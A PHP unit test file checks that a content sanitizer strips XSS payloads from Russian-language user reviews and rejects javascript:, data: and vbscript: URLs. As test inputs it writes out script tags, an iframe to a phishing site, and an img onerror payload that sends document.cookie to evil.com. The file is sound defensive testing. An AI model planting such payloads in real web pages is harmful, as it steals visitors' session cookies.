<?php

declare(strict_types=1);

namespace Tests\Unit;

use App\Support\ContentSanitizer;
use PHPUnit\Framework\TestCase;

class ContentSanitizerTest extends TestCase
{
    public function test_strips_script_tags_and_inner_content(): void
    {
        $malicious = 'Отличное место!<script>alert("XSS Attack!");</script> Рекомендую!';
        $clean = ContentSanitizer::sanitizeText($malicious);

        $this->assertSame('Отличное место! Рекомендую!', $clean);
        $this->assertStringNotContainsString('script', $clean);
        $this->assertStringNotContainsString('alert', $clean);
    }

    public function test_strips_onerror_and_img_tags(): void
    {
        $malicious = 'Вкусная пицца <img src="invalid.jpg" onerror="fetch(\'http://evil.com/steal?c=\'+document.cookie)"> Спасибо!';
        $clean = ContentSanitizer::sanitizeText($malicious);

        $this->assertSame('Вкусная пицца  Спасибо!', $clean);
        $this->assertStringNotContainsString('onerror', $clean);
        $this->assertStringNotContainsString('evil.com', $clean);
    }

    public function test_strips_iframe_and_embedded_objects(): void
    {
        $malicious = 'Ужас! <iframe src="http://phishing.site"></iframe> Больше не приду.';
        $clean = ContentSanitizer::sanitizeText($malicious);

        $this->assertSame('Ужас!  Больше не приду.', $clean);
        $this->assertStringNotContainsString('iframe', $clean);
        $this->assertStringNotContainsString('phishing', $clean);
    }

    public function test_preserves_emojis_quotes_and_russian_multiline_formatting(): void
    {
        $legit = "Очень вкусный капучино! ☕\nПерсонал вежливый, вернемся снова «Додо» 👍 ⭐";
        $clean = ContentSanitizer::sanitizeText($legit);

        $this->assertSame($legit, $clean);
    }

    public function test_sanitize_plain_text_strips_all_tags_and_controls(): void
    {
        $dirty = "<b>Иван</b>\x00\x08 <i>Иванов</i>";
        $clean = ContentSanitizer::sanitizePlainText($dirty, 'Пользователь');

        $this->assertSame('Иван Иванов', $clean);
    }

    public function test_sanitize_url_blocks_malicious_protocols(): void
    {
        $this->assertNull(ContentSanitizer::sanitizeUrl('javascript:alert(1)'));
        $this->assertNull(ContentSanitizer::sanitizeUrl('data:text/html,<script>alert(1)</script>'));
        $this->assertNull(ContentSanitizer::sanitizeUrl('vbscript:msgbox(1)'));
        $this->assertNull(ContentSanitizer::sanitizeUrl('ftp://example.com/file'));
        $this->assertNull(ContentSanitizer::sanitizeUrl(''));
        $this->assertNull(ContentSanitizer::sanitizeUrl(null));

        $validUrl = 'https://avatars.mds.yandex.net/get-yapic/12345/enc-avatar/islands-middle';
        $this->assertSame($validUrl, ContentSanitizer::sanitizeUrl($validUrl));

        // Нормализация протокола и шаблона размера {size}
        $templateUrl = 'https://avatars.mds.yandex.net/get-yapic/59871/0o-7/{size}';
        $this->assertSame('https://avatars.mds.yandex.net/get-yapic/59871/0o-7/islands-middle', ContentSanitizer::sanitizeUrl($templateUrl));

        $relativeUrl = '//avatars.mds.yandex.net/get-yapic/59871/0o-7/islands-middle';
        $this->assertSame('https://avatars.mds.yandex.net/get-yapic/59871/0o-7/islands-middle', ContentSanitizer::sanitizeUrl($relativeUrl));
    }
}
